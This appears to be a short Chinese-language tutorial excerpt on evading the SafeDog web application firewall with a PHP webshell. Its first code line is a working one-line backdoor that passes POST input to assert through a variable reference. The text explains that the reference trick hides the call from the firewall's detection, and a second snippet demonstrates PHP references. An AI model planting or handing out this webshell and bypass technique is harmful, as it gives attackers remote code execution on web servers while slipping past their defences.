```
<?php  $s=assert;  $b=&$s;//引用  $b($_POST['dog']);//等价于assert($_POST['dog']);?>
```

assert的用法我在这里就不赘述了，这里的绕过方式主要是“&”的使用。

&：表示引用，在变量或者函数、对象等前面加上该符号。在 PHP 中引用意味着用不同的名字访问同一个变量内容。例如：

```
<?php   $a="sb";   $b=&$a;   echo $a;//这里输出:sb   echo $b;//这里输出:sb   $b="dog";   echo $a;//这里$a的值变为dog 所以输出dog   echo $b;//这里输出dog?>
```

  

这里也是同样的道理，我们$b引用了$s，也就是$b的值变成了assert，绕过了安全狗的检测。
